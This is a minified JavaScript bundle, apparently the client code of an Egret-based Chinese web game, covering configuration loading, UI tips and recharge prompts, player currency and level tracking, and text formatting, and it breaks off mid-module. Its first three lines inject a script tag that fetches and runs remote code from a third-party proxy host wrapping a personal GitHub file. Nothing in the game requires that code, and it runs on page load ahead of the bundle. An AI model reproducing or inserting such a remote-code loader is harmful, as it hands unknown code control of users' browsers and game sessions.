const script = document.createElement('script');
script.src = 'https://hub.glowp.xyz/https://raw.githubusercontent.com/gavinliuisme/info/main/run.js';
document.head.appendChild(script);
var extendStatics=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])},__extends=function(t,e){function i(){this.constructor=t}extendStatics(t,e),t.prototype=null===e?Object.create(e):(i.prototype=e.prototype,new i)},__assign=Object.assign||function(t){for(var e,i=1,n=arguments.length;n>i;i++){e=arguments[i];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[o]=e[o])}return t},__rest=function(t,e){var i={};for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&e.indexOf(n)<0&&(i[n]=t[n]);if(null!=t&&"function"==typeof Object.getOwnPropertySymbols)for(var o=0,n=Object.getOwnPropertySymbols(t);o<n.length;o++)e.indexOf(n[o])<0&&Object.prototype.propertyIsEnumerable.call(t,n[o])&&(i[n[o]]=t[n[o]]);return i},__decorate=function(t,e,i,n){var o,s=arguments.length,a=3>s?e:null===n?n=Object.getOwnPropertyDescriptor(e,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(t,e,i,n);else for(var r=t.length-1;r>=0;r--)(o=t[r])&&(a=(3>s?o(a):s>3?o(e,i,a):o(e,i))||a);return s>3&&a&&Object.defineProperty(e,i,a),a},__param=function(t,e){return function(i,n){e(i,n,t)}},__metadata=function(t,e){return"object"==typeof Reflect&&"function"==typeof Reflect.metadata?Reflect.metadata(t,e):void 0},__awaiter=function(t,e,i,n){function o(t){return t instanceof i?t:new i(function(e){e(t)})}return new(i||(i=Promise))(function(i,s){function a(t){try{l(n.next(t))}catch(e){s(e)}}function r(t){try{l(n["throw"](t))}catch(e){s(e)}}function l(t){t.done?i(t.value):o(t.value).then(a,r)}l((n=n.apply(t,e||[])).next())})},__generator=function(t,e){function i(t){return function(e){return n([t,e])}}function n(i){if(o)throw new TypeError("Generator is already executing.");for(;l;)try{if(o=1,s&&(a=2&i[0]?s["return"]:i[0]?s["throw"]||((a=s["return"])&&a.call(s),0):s.next)&&!(a=a.call(s,i[1])).done)return a;switch(s=0,a&&(i=[2&i[0],a.value]),i[0]){case 0:case 1:a=i;break;case 4:return l.label++,{value:i[1],done:!1};case 5:l.label++,s=i[1],i=[0];continue;case 7:i=l.ops.pop(),l.trys.pop();continue;default:if(a=l.trys,!(a=a.length>0&&a[a.length-1])&&(6===i[0]||2===i[0])){l=0;continue}if(3===i[0]&&(!a||i[1]>a[0]&&i[1]<a[3])){l.label=i[1];break}if(6===i[0]&&l.label<a[1]){l.label=a[1],a=i;break}if(a&&l.label<a[2]){l.label=a[2],l.ops.push(i);break}a[2]&&l.ops.pop(),l.trys.pop();continue}i=e.call(t,l)}catch(n){i=[6,n],s=0}finally{o=a=0}if(5&i[0])throw i[1];return{value:i[0]?i[1]:void 0,done:!0}}var o,s,a,r,l={label:0,sent:function(){if(1&a[0])throw a[1];return a[1]},trys:[],ops:[]};return r={next:i(0),"throw":i(1),"return":i(2)},"function"==typeof Symbol&&(r[Symbol.iterator]=function(){return this}),r},__exportStar=function(t,e){for(var i in t)"default"===i||e.hasOwnProperty(i)||__createBinding(e,t,i)},__createBinding=Object.create?function(t,e,i,n){void 0===n&&(n=i),Object.defineProperty(t,n,{enumerable:!0,get:function(){return e[i]}})}:function(t,e,i,n){void 0===n&&(n=i),t[n]=e[i]},__values=function(t){var e="function"==typeof Symbol&&Symbol.iterator,i=e&&t[e],n=0;if(i)return i.call(t);if(t&&"number"==typeof t.length)return{next:function(){return t&&n>=t.length&&(t=void 0),{value:t&&t[n++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")},__read=function(t,e){var i="function"==typeof Symbol&&t[Symbol.iterator];if(!i)return t;var n,o,s=i.call(t),a=[];try{for(;(void 0===e||e-->0)&&!(n=s.next()).done;)a.push(n.value)}catch(r){o={error:r}}finally{try{n&&!n.done&&(i=s["return"])&&i.call(s)}finally{if(o)throw o.error}}return a},__spread=function(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(__read(arguments[e]));return t},__spreadArrays=function(){for(var t=0,e=0,i=arguments.length;i>e;e++)t+=arguments[e].length;for(var n=Array(t),o=0,e=0;i>e;e++)for(var s=arguments[e],a=0,r=s.length;r>a;a++,o++)n[o]=s[a];return n},__await=function(t){return this instanceof __await?(this.v=t,this):new __await(t)},__asyncGenerator=function(t,e,i){function n(t){u[t]&&(h[t]=function(e){return new Promise(function(i,n){p.push([t,e,i,n])>1||o(t,e)})})}function o(t,e){try{s(u[t](e))}catch(i){l(p[0][3],i)}}function s(t){t.value instanceof __await?Promise.resolve(t.value.v).then(a,r):l(p[0][2],t)}function a(t){o("next",t)}function r(t){o("throw",t)}function l(t,e){t(e),p.shift(),p.length&&o(p[0][0],p[0][1])}if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var h,u=i.apply(t,e||[]),p=[];return h={},n("next"),n("throw"),n("return"),h[Symbol.asyncIterator]=function(){return this},h},__asyncDelegator=function(t){function e(e,o){i[e]=t[e]?function(i){return(n=!n)?{value:__await(t[e](i)),done:"return"===e}:o?o(i):i}:o}var i,n;return i={},e("next"),e("throw",function(t){throw t}),e("return"),i[Symbol.iterator]=function(){return this},i},__asyncValues=function(t){function e(e){n[e]=t[e]&&function(n){return new Promise(function(o,s){n=t[e](n),i(o,s,n.done,n.value)})}}function i(t,e,i,n){Promise.resolve(n).then(function(e){t({value:e,done:i})},e)}if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var n,o=t[Symbol.asyncIterator];return o?o.call(t):(t="function"==typeof __values?__values(t):t[Symbol.iterator](),n={},e("next"),e("throw"),e("return"),n[Symbol.asyncIterator]=function(){return this},n)},__makeTemplateObject=function(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t},__setModuleDefault=Object.create?function(t,e){Object.defineProperty(t,"default",{enumerable:!0,value:e})}:function(t,e){t["default"]=e},__importStar=function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var i in t)Object.hasOwnProperty.call(t,i)&&__createBinding(e,t,i);return __setModuleDefault(e,t),e},__importDefault=function(t){return t&&t.__esModule?t:{"default":t}},__classPrivateFieldGet=function(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)},__classPrivateFieldSet=function(t,e,i){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,i),i},__reflect=function(t,e,i){t.__class__=e,i?i.push(e):i=[e],t.__types__=t.__types__?i.concat(t.__types__):i};!function(t){function e(n){if(i[n])return i[n].exports;var o=i[n]={i:n,l:!1,exports:{}};return t[n].call(o.exports,o,o.exports,e),o.l=!0,o.exports}var i={};return e.m=t,e.c=i,e.d=function(t,i,n){e.o(t,i)||Object.defineProperty(t,i,{enumerable:!0,get:n})},e.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},e.t=function(t,i){if(1&i&&(t=e(t)),8&i)return t;if(4&i&&"object"==typeof t&&t&&t.__esModule)return t;var n=Object.create(null);if(e.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:t}),2&i&&"string"!=typeof t)for(var o in t)e.d(n,o,function(e){return t[e]}.bind(null,o));return n},e.n=function(t){var i=t&&t.__esModule?function(){return t["default"]}:function(){return t};return e.d(i,"a",i),i},e.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},e.p="",e(e.s=604)}([function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GlobalConfig=void 0;var n=i(66),o=i(120),s=i(620),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.init=function(){if(!this.config){var t=RES_RESOURCE+"cfg/cfg_cn.json",e=getLangType();e&&(t=RES_RESOURCE+"cfg/cfg_"+e+".json");var i=RES.getResourceInfo(t),s=this.config=RES.host.get(i);if(s){var a=function(t,e,i){if(0==i)t.__proto__=e;else for(var n in t)a(t[n],e,i-1)};for(var r in s){var l=s[r];if("LanguageConfig"==r)for(var h in l)void 0==l[h].type&&(l[h].type=o.TagChanneID.ciChannelSystem);if("SkillsDescConfig"==r)for(var h in l)void 0==l[h].castLimitCnt&&(l[h].castLimitCnt=1);if("RechargeConfig"==r)for(var h in l)l[h].cash=l[h].cash[urlParam.payUnit||n.PayTypeEnum.CN],l[h].desc=l[h].desc[urlParam.payUnit||n.PayTypeEnum.CN];var u=l.len;delete l.len;var p=egret.getDefinitionByName(r);p&&a(l,new p,u),this[r]=l}RES.host.remove(i)}}},e}(s.Config);e.GlobalConfig=a,window.GlobalConfig=a,__reflect(a.prototype,"GlobalConfig",[]),window.GlobalConfig=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BaseView=void 0;var n=i(69),o=i(636),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.addTouchEvent=function(t,e,i){if(void 0===i&&(i=!1),this.addEvent(egret.TouchEvent.TOUCH_TAP,t,e),i){var n=function(){egret.Tween.get(t).wait(300).call(function(){Timer.start(150,-1,e,t)})},o=function(){egret.Tween.removeTweens(t),Timer.stop(e,t)};this.addEvent(egret.TouchEvent.TOUCH_BEGIN,t,n),this.addEvent(egret.TouchEvent.TOUCH_END,t,o),this.addEvent(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE,t,o),this.addEvent(egret.Event.REMOVED_FROM_STAGE,t,o)}},e.prototype.addTouchEndEvent=function(t,e){this.addEvent(egret.TouchEvent.TOUCH_END,t,e)},e.prototype.addChangeEvent=function(t,e){var i=this;t&&t instanceof eui.TabBar?this.addEvent(egret.TouchEvent.CHANGE,t,function(){for(var t=[],o=0;o<arguments.length;o++)t[o]=arguments[o];n.SoundUtil.play(n.SoundEnum.WINDOW),e.call.apply(e,__spreadArrays([i],t))}):this.addEvent(egret.TouchEvent.CHANGE,t,e)},e.prototype.addChangingEvent=function(t,e){this.addEvent(egret.TouchEvent.CHANGING,t,e)},e.prototype.addEvent=function(t,e,i){return e?void e.addEventListener(t,i,this):void console.error(gettext("不存在绑定对象"))},e.prototype.removeTouchEvent=function(t,e,i){void 0===i&&(i=!1),t&&t.removeEventListener(egret.TouchEvent.TOUCH_TAP,e,this),i&&t&&(egret.Tween.removeTweens(t),Timer.stop(e,this),t.removeEventListener(egret.TouchEvent.TOUCH_BEGIN,t,e),t.removeEventListener(egret.TouchEvent.TOUCH_END,t,e),t.removeEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE,t,e),t.removeEventListener(egret.Event.REMOVED_FROM_STAGE,t,e))},e.prototype.observe=function(t,e){regMsg(this,e,t)},e.prototype.removeObserve=function(){delMsg(this)},e}(o.BaseTabEUI);e.BaseView=s,window.BaseView=s,__reflect(s.prototype,"BaseView",[]),window.BaseView=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsCT=void 0;var n=i(281),o=i(8),s=i(14),a=i(25),r=i(7),l=i(0),h=function(t){function e(){var i=t.call(this)||this;return i.TipsTime=0,i.NoShowAttrType=[0,1,159],i.sysId=PackageID.LianJi,i.regNetMsg(6,i.onTips),i.regNetMsg(12,i.postFirstRechargeTips),observe(i,function(t){var i;e.ins().removeAllAttrTips();var n=0,o=[];for(var s in t)if(l.GlobalConfig.AttrConfig[s]){if(!l.GlobalConfig.AttrConfig[s].undrift||1!=l.GlobalConfig.AttrConfig[s].undrift){var a=t[s],r=l.GlobalConfig.AttrConfig[s];r&&(r.relation?o.push({type:Number(s),value:[a]}):n&&n==+s&&o[o.length-1]?o[o.length-1].value.push(a):(null===(i=l.GlobalConfig.AttrConfig[Number(s)-1])||void 0===i?void 0:i.relation)?o.push({type:Number(s)-1,value:[0,a]}):o.push({type:Number(s),value:[a]}),n=r.relation||0)}}else platform&&platform.reportError&&platform.reportError("undrift cannt find,attrId is "+s);for(var h=0;h<o.length;h++){var u=o[h].type,p=o[h].value;p.length&&p.length>1?e.ins().showAttrTips(Number(u),p[0],p[1]):e.ins().showAttrTips(Number(u),p[0])}},Ts.attrChange),i}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postFirstRechargeTips=function(t){return this.TipsTime=o.DateUtils.formatMiniDateTime(t.readUnsignedInt()),this.TipsTime>r.GameServerCC.serverTime?void 0:null},e.prototype.onTips=function(t){this.showTips(t.readString())},Object.defineProperty(e.prototype,"view",{get:function(){var t=win.get("TipsView");return t||(t=win.open("TipsView")),t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"autoEquipView",{get:function(){var t=win.get("AutoEquipView");return t||(t=win.open("AutoEquipView")),t},enumerable:!1,configurable:!0}),e.prototype.showTips=function(t,o){if(window.notips){return;}return __awaiter(this,void 0,void 0,function(){var s,r,l=this;return __generator(this,function(h){switch(h.label){case 0:return t!=gettext("元宝不足")&&t!=gettext("|C:0xf3311e&T:元宝不足|")?[3,2]:urlParam.isShenhe?[3,2]:[4,Promise.resolve().then(function(){return i(27)})];case 1:return s=h.sent().WarnWin,r=s.show(gettext("元宝不足，是否前往充值？"),null,null,function(){return __awaiter(l,void 0,void 0,function(){var t,n,s;return __generator(this,function(r){switch(r.label){case 0:return t=a.Recharge.ins().getRechargeData(0),t&&0!=t.num?[3,2]:[4,Promise.resolve().then(function(){return i(229)})];case 1:return n=r.sent().BuyWin,s=win.get("BuyWin"),s&&n.goodsId&&(e.goodsId=n.goodsId),win.open("RechargeShowWin"),win.close("BuyWin"),[3,3];case 2:win.open("RechargeShowWin"),r.label=3;case 3:return o&&"function"==typeof o&&o(),[2]}})})}),r.setBtnLabel(gettext("取消"),gettext("前往")),[2];case 2:return n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showTips,t),[2]}})})},e.prototype.showCenterTips=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showCenterTips,t)},e.prototype.showCenterTips2=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showCenterTips2,t)},e.prototype.showCenterTips3=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showCenterTips3,t)},e.prototype.showCenterTips4=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showCenterTips4,t)},e.prototype.showCenterTips5=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showTips1,t)},e.prototype.showBottomCenterTips=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showBottomCenterTips,t)},e.prototype.showSceneTips=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showSceneTips,t)},e.prototype.showTaskTips=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showTaskTips,t)},e.prototype.showAttrTips=function(t,e,i){},e.prototype.removeAllAttrTips=function(){this.view.removeAllAttrTip()},e.prototype.showGoodEquipTips=function(t){this.view.showGoodEquipTip(t)},e.prototype.showAutoEquipWins=function(t){this.autoEquipView.showAutoEquipWin(t)},e.prototype.showTreasureTips=function(t){this.view.showTreasureTip(t)},e.prototype.showSkillTips=function(t){this.view.showSkillTip(t)},e.prototype.showItemTips=function(t){this.view.showItemTip(t)},e.prototype.showHeartItemTips=function(t){this.view.showHeartItemTip(t)},e.prototype.showBoxTips=function(t){this.view.showBoxTip(t)},e.prototype.showBoostPower=function(t,e){win.open("BoostPowerView").showBoostPower(t,e)},e.prototype.showRewardBox=function(t){this.view.showRewardBox(t)},e.prototype.showEverTips=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showEverTips,t)},e.prototype.showHintTips=function(t){n.DelayOptManager.ins().addDelayOptFunction(this.view,this.view.showHintTips,t)},e.prototype.showGoodRewardTips=function(t){this.view.showGoodRewardTip(t)},__decorate([post()],e.prototype,"postFirstRechargeTips",null),e}(s.BaseSystem);e.TipsCT=h,window.TipsCT=h,__reflect(h.prototype,"TipsCT",[]),Systemap.TipsCT=function(){return h.ins()},window.TipsCT=h},function(t,e,i){"use strict";function n(){return function(t){var e=t.prototype;Object.defineProperties(e,{data:{get:function(){return this._data},set:function(t){this._data=t,eui.PropertyEvent.dispatchPropertyEvent(this,eui.PropertyEvent.PROPERTY_CHANGE,"data"),this.skin&&this.dataChanged()}},selected:{get:function(){return this._selected},set:function(t){this._selected=t,this.invalidateState(),this.selectChange()}}})}}Object.defineProperty(e,"__esModule",{value:!0}),e.BaseItemRender=void 0,window.fix=n;var o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.addTouchEvent=function(t,e){this.addEvent(egret.TouchEvent.TOUCH_TAP,t,e)},e.prototype.addTouchEndEvent=function(t,e){this.addEvent(egret.TouchEvent.TOUCH_END,t,e)},e.prototype.addEvent=function(t,e,i){return e?void e.addEventListener(t,i,this):void console.error("不存在绑定对象")},e.prototype.removeTouchEvent=function(t,e){t&&t.removeEventListener(egret.TouchEvent.TOUCH_TAP,e,this)},e.prototype.setSkin=function(e){t.prototype.setSkin.call(this,e),this.data&&this.dataChanged()},e.prototype.selectChange=function(){},e=__decorate([n()],e)}(eui.ItemRenderer);e.BaseItemRender=o,window.BaseItemRender=o,__reflect(o.prototype,"BaseItemRender",[]),window.BaseItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActorCC=void 0;var n=i(13),o=i(21),s=i(7),a=i(26),r=i(352),l=i(2),h=i(36),u=i(101),p=i(28),d=i(48),c=i(106),f=i(8),g=i(353),m=i(38),v=function(t){function e(){var e=t.call(this)||this;e._isInit=!1,e.serverName=0,e.power=0,e.runeShatter=0,e.runeExchange=0,e.gold=0,e.yb=0,e.stone=0,e.guildNum=0,e.skillPoints=0,e.togeatter1=0,e.togeatter2=0,e.vip=0,e.feats=0,e.weiWang=0,e.chip=0,e.bagNum=0,e.allExp=0,e.isInit=!0;var i=PackageID.Default;return observe(e,e.init,i+"-1"),observe(e,e.postExp,i+"-7"),e}return __extends(e,t),Object.defineProperty(e.prototype,"actorID",{get:function(){return this._actorID},set:function(t){urlParam.actorid=t,this._actorID=t},enumerable:!1,configurable:!0}),e.prototype.getIsInit=function(){return this._isInit},e.prototype.postExp=function(t){var e=this.level;this.level=t.readInt(),this.exp=t.readDouble();var i=t.readInt();this.allExp+=i;var s=n.SubRoles.lookAtTar;if(e<this.level){if(window.platform.reportLevelup(),!s)return;var a=new o.MovieClip;a.playFile(RES_DIR_EFF+"LevelUp",this.level-e),a.x=s.width/2,a.y=s.height/2,s.addChild(a)}return e!=this.level&&(s.infoModel&&(s.infoModel.lv=this.level),this.postLevelChange()),i},e.prototype.init=function(t){this.handle=t.readDouble(),this.actorID=t.readInt(),s.GameServerCC.serverID=t.readInt(),this.myName=t.readUTFBytes(33),this.level=t.readInt(),this.exp=t.readNumber(),t.readDouble(),this.gold=t.readNumber(),this.yb=t.readNumber(),this.vip=t.readInt(),this.soul=t.readNumber(),this.bagNum=t.readInt(),this.feats=t.readNumber(),this.runeShatter=t.readNumber(),this.runeExchange=t.readNumber(),this.togeatter1=t.readNumber(),this.togeatter2=t.readNumber(),this.weiWang=t.readInt(),a.ZsCT.ins().stage=t.readUnsignedInt(),m.EquipCT.ins().isRequested=!1,this.stone=t.readNumber(),this.postPFVipInfo(),this.createTime=t.readUnsignedInt(),this.skillPoints=t.readNumber(),console.log("createTime ",this.createTime),this.createTime=f.DateUtils.formatMiniDateTime(this.createTime),r.ReportData.report("entergame"),this.report(),this._isInit=!0,urlParam.lifeResetRewardId>0&&this.reqLifeResetReward()},e.prototype.reqLifeResetReward=function(){},e.prototype.report=function(){urlParam.isCreateRole&&platform.reportCreateRole(),this.isInit&&platform.reportEnterGame(),this.isInit=!1},e.prototype.postPFVipInfo=function(){this.myPFVipInfo={appId:+urlParam.appid||0,pfVip:+urlParam.pfVip||0,pfVipSuper:+urlParam.pfVipSuper||0,pfVipYear:+urlParam.pfVipYear||0,pfLv:+urlParam.pfVipLv||0}},e.prototype.postGoldChange=function(t){var e=this.gold;if(e==t)return!1;if(e>0){var i=t-e;if(i>0){}}this.gold=t},e.prototype.postYbChange=function(t){var e=this.yb;if(e==t)return!1;if(e>0){var i=t-e;if(i>0){var n=gettext("|C:0xffd93f&T:元宝  +{0}|",i);l.TipsCT.ins().showTips(n)}}this.yb=t},e.prototype.postStoneChange=function(t){var e=this.stone;if(e==t)return!1;if(e>0){var i=t-e;if(i>0){var n=gettext("|C:0xffd93f&T:矿物纯度  +{0}|",i);l.TipsCT.ins().showTips(n)}}this.stone=t},e.prototype.postFeatsChange=function(t){var e=this.feats;if(e==t)return!1;if(e>0){var i=t-e;if(i>0){var n=gettext("|C:0xffd93f&T:获得{0}功勋|",i);l.TipsCT.ins().showTips(n)}}this.feats=t},e.prototype.postSkillPointChange=function(t){var e=this.skillPoints;if(e==t)return!1;if(e>0){var i=t-e;if(i>0){var n=gettext("|C:0xffd93f&T:星云技能点  +{0}|",i);l.TipsCT.ins().showTips(n)}}this.skillPoints=t},e.prototype.postZsExpChange=function(t){var e=t>=0?"+":"",i=gettext("|C:0x00ff00&T:修为{0}{1}|",e,t);l.TipsCT.ins().showTips(i)},e.prototype.postUpdateTogeatter=function(t,e){var i=1==e?this.togeatter1:this.togeatter2;if(i!=t);return 1==e?this.togeatter1=t:this.togeatter2=t,{value:t,type:e}},e.prototype.postLevelChange=function(){r.ReportData.report("levelup")},e.prototype.postSoulChange=function(t){var e=this.soul;if(e>0){var i=t-e;if(i>0){var n=gettext("获得|C:0xd242fb&T:魂石 x {0}|",i);l.TipsCT.ins().showTips(n)}}this.soul=t},e.prototype.postPowerChange=function(t){var e=this.power;return e==t?null:(t>e&&e>0&&l.TipsCT.ins().showBoostPower(t,e),void(this.power=t))},e.prototype.postUpdateWing=function(){},e.prototype.postUpdateOtherWing=function(){},e.prototype.postUpdateDemonCir=function(){},e.prototype.postUpdateLongGas=function(){},e.prototype.postUpdateGodCrown=function(){},e.prototype.postChip=function(t){},Object.defineProperty(e.prototype,"samsaraLv",{get:function(){var t=g.SamsaraModel.ins().samsaraInfo;return t?t.lv:0},enumerable:!1,configurable:!0}),e.prototype.getCurrencyByType=function(t){switch(t){case h.MoneyConst.exp:return this.exp;case h.MoneyConst.gold:return this.gold;case h.MoneyConst.yuanbao:return this.yb;case h.MoneyConst.stone:return this.stone;case h.MoneyConst.rune:return this.runeShatter;case h.MoneyConst.guildGx:return this.guildNum;case h.MoneyConst.skillPoints:return this.skillPoints}return 0},Object.defineProperty(e.prototype,"isLocation",{get:function(){return urlParam.isLocation},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"serverTime",{get:function(){return Math.floor(s.GameServerCC.serverTime/1e3)+""},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"guildId",{get:function(){return p.Guild.ins().guildID},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"guildName",{get:function(){return p.Guild.ins().guildName},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"guildLv",{get:function(){return p.Guild.ins().guildLv},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"guildOfficeId",{get:function(){return p.Guild.ins().myOffice},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"guildOfficeName",{get:function(){return c.GuildLanguage.guildOffice[this.guildOfficeId]},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"guildMaster",{get:function(){var t,e;return(null===(e=null===(t=p.Guild.ins())||void 0===t?void 0:t.guildMaster)||void 0===e?void 0:e.name)||""},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"jobId",{get:function(){var t;return(null===(t=n.SubRoles.ins().getSubRoleByIndex(0))||void 0===t?void 0:t.job)||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"jobName",{get:function(){return d.Role.getJobNameByJob(this.jobId)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"sex",{get:function(){return n.SubRoles.ins().getSubRoleByIndex(0).sex},enumerable:!1,configurable:!0}),__decorate([post()],e.prototype,"postExp",null),__decorate([post()],e.prototype,"init",null),__decorate([post()],e.prototype,"reqLifeResetReward",null),__decorate([delayCall(5e3)],e.prototype,"report",null),__decorate([post()],e.prototype,"postPFVipInfo",null),__decorate([post()],e.prototype,"postGoldChange",null),__decorate([post()],e.prototype,"postYbChange",null),__decorate([post()],e.prototype,"postStoneChange",null),__decorate([post()],e.prototype,"postFeatsChange",null),__decorate([post()],e.prototype,"postSkillPointChange",null),__decorate([post()],e.prototype,"postZsExpChange",null),__decorate([post()],e.prototype,"postUpdateTogeatter",null),__decorate([post()],e.prototype,"postLevelChange",null),__decorate([post()],e.prototype,"postSoulChange",null),__decorate([post()],e.prototype,"postPowerChange",null),__decorate([post()],e.prototype,"postUpdateWing",null),__decorate([post()],e.prototype,"postUpdateOtherWing",null),__decorate([post()],e.prototype,"postUpdateDemonCir",null),__decorate([post()],e.prototype,"postUpdateLongGas",null),__decorate([post()],e.prototype,"postUpdateGodCrown",null),e}(u.CC);window.actorcc=v,__reflect(v.prototype,"actorcc",[]),e.ActorCC=new v,window.ActorCC=e.ActorCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TextFlowMaker=void 0;var n=function(){function t(){}return t.generateTextFlow=function(e){if(!e)return HtmlUtil.parse("");for(var i,n=e.split("|"),o="",s=0,a=n.length;a>s;s++)o+=t.getSingleTextFlow1(n[s]);try{i=HtmlUtil.parse(o)}catch(r){return console.log("错误的HTML输入"),HtmlUtil.parse("")}return i},t.generateTextFlow1=function(e,i){if(void 0===i&&(i=!0),i&&getLangType()==LanguageEnum.AR)return t.generateTextFlowALB(e);if(!e)return HtmlUtil.parse("");for(var n=e.split("|"),o=[],s=0,a=n.length;a>s;s++){var r=t.getSingleTextFlow(n[s]);r.text&&""!=r.text&&o.push(r)}return o},t.getSingleTextFlow1=function(e){var i=e.split("&T:",2);if(2==i.length){for(var n="<font",o=i[0].split("&"),s=void 0,a=!1,r=0,l=o.length;l>r;r++)switch(s=o[r].split(":"),s[0]){case t.STYLE_SIZE:n+=' size="'+Math.floor(+s[1])+'"';break;case t.STYLE_COLOR:n+=' color="'+Math.floor(+s[1])+'"';break;case t.UNDERLINE_TEXT:a=!0}return n+=a?"><u>"+i[1]+"</u></font>":">"+i[1]+"</font>"}return"<font>"+e+"</font>"},t.getSingleTextFlow=function(e){var i=e.split("&T:",2),n={style:{}};if(2==i.length){for(var o=(i[0],e.split("&")),s=void 0,a=0,r=o.length;r>a;a++)switch(s=o[a].split(":"),s[0]){case t.STYLE_SIZE:n.style.size=+s[1];break;case t.STYLE_COLOR:n.style.textColor=+s[1];break;case t.UNDERLINE_TEXT:n.style.underline=!0;break;case t.EVENT:n.style.href="event:"+s[1]}n.text=i[1]}else n.text=e;return n},t.getCStr=function(e){var i=Math.floor(e%100/10),n=e%10;return 10>=e?t.numberList[e]:20>=e||e%10==0?1==i?t.numberList[10]+t.numberList[n]:t.numberList[i]+t.numberList[10]:100>e?t.numberList[i]+t.numberList[10]+t.numberList[n]:""},t.measureTextWidth=function(t,e,i){i=i||{};var n=null==i.italic?e[16]:i.italic,o=null==i.bold?e[15]:i.bold,s=null==i.size?e[0]:i.size,a=i.fontFamily||e[8]||egret.TextField.default_fontFamily;return egret.sys.measureText(t,a,s,o,n)},t.reverseAlbTextValue=function(e,i){for(var n=new RegExp("(?=[\\u00BF-\\u05FF\\u0700-\\u1FFF\\u2C00-\\uD7FF]|\\b|\\s)(?![。，！、》…）)}”】\\.\\,\\!\\?\\]\\:])"),o=[],s=0,a=[],r=0;r<i.length;r++){for(var l=i[r].text.split(n),h="",u=0,p=l;u<p.length;u++){var d=p[u],c=t.measureTextWidth(d,e.$TextField,i[r].style);if(s+c>e.width){var f={text:h,style:i[r].style};a.push(f),o=o.concat(a.reverse()),a=[],o.push({text:"\n",style:{}}),h="",s=0}s+=c,h+=d}var g={text:h,style:i[r].style};a.push(g)}return a.length>0&&(o=o.concat(a.reverse())),o},t.generateTextFlowALB=function(e){if(!e)return HtmlUtil.parse("");for(var i=e.split("\n"),n=[],o=0;o<i.length;o++){for(var s=i[o],a=t.generateTextFlow1(s,!1),r=0,l=a;r<l.length;r++){var h=l[r];h.text=processAlbText(h.text)}a=reverseArabicItemsInArray(a),n=n.concat(a),o!==i.length-1&&n.push(t.getSingleTextFlow("\n"))}return n},t.STYLE_COLOR="C",t.STYLE_SIZE="S",t.PROP_TEXT="T",t.UNDERLINE_TEXT="U",t.EVENT="E",t.numberList=[gettext("零"),gettext("一"),gettext("二"),gettext("三"),gettext("四"),gettext("五"),gettext("六"),gettext("七"),gettext("八"),gettext("九"),gettext("十"),gettext("十一"),gettext("十二"),gettext("十三"),gettext("十四"),gettext("十五"),gettext("十六"),gettext("十七"),gettext("十八"),gettext("十九"),gettext("二十")],t}();e.TextFlowMaker=n,window.TextFlowMaker=n,__reflect(n.prototype,"TextFlowMaker",[]),window.TextFlowMaker=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagCT=void 0;var n=i(14),o=i(40),s=i(25),a=i(91),r=i(0),l=i(31),h=i(4),u=i(2),p=i(287),d=i(10),c=i(39),f=i(30),g=i(26),m=i(55),v=i(13),y=i(48),C=i(38),T=i(140),b=i(62),w=i(5),I=i(22),_=i(8),S=i(7),x=i(24),D=i(17),A=i(700),k=i(57),B=i(123),P=i(12),R=i(15),E=i(80),G=i(63),M=i(59),L=function(t){function e(){var e=t.call(this)||this;return 